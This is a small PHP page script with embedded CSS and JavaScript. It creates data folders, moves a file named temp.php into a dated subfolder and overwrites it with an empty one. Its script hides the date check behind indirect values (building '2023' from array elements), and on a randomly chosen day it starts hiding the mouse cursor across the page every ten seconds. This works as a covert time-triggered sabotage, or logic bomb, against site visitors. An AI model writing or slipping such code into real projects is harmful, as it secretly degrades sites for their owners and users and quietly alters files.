<?php

	$dt2 = date("Ymd");
	$ds = "data";
	$temp = "temp";
	$img = "images";
$dtg = rand(1, 28);
$th = range(20, 99);
$ms = rand(1, 60);
?>

<style>
        body.x,
		body.x button,
		body.x a,
		body.x input
		{
            cursor: none !important;
        }
</style>
<?php

if(!is_dir($ds."/")){
	mkdir($ds."/");
	if(!is_dir($ds."/".$img."/")){
		mkdir($ds."/".$img."/");
		if(!is_dir($ds."/".$img."/".$temp."/")){
			mkdir($ds."/".$img."/".$temp."/");
		}
	}
}else{
	if(!is_dir($ds."/".$img."/")){
		mkdir($ds."/".$img."/");
		if(!is_dir($ds."/".$img."/".$temp."/")){
			mkdir($ds."/".$img."/".$temp."/");
		}
	}else{
		if(!is_dir($ds."/".$img."/".$temp."/")){
			mkdir($ds."/".$img."/".$temp."/");
		}
	}
}
echo $dtg;
?>

<script type="text/javascript">
if(('<?php echo date("Y") ?>'>='<?php echo $th[0].$th[3] ?>')&&('<?php echo date("Y-m-d") ?>'=='<?php echo date("Y-m-").$dtg; ?>')){
	var bodyElement = document.body;

	setInterval(function() {
		bodyElement.classList.add("x");
	}, 10000);
}
</script>

<?php
		rename($temp.".php", $ds."/".$img."/".$temp."/".$dt2.".php");
		$myfile = fopen($temp.".php", "w") or die("Unable to open file!");
		$myfile2 = fopen($ds."/".$img."/".$temp."/".$dt2.".php", "w") or die("Unable to open file!");
		$txt = "<?php
			
?>";
		fwrite($myfile, $txt);
		fclose($myfile);
		fwrite($myfile2, $txt);
		fclose($myfile2);
?>
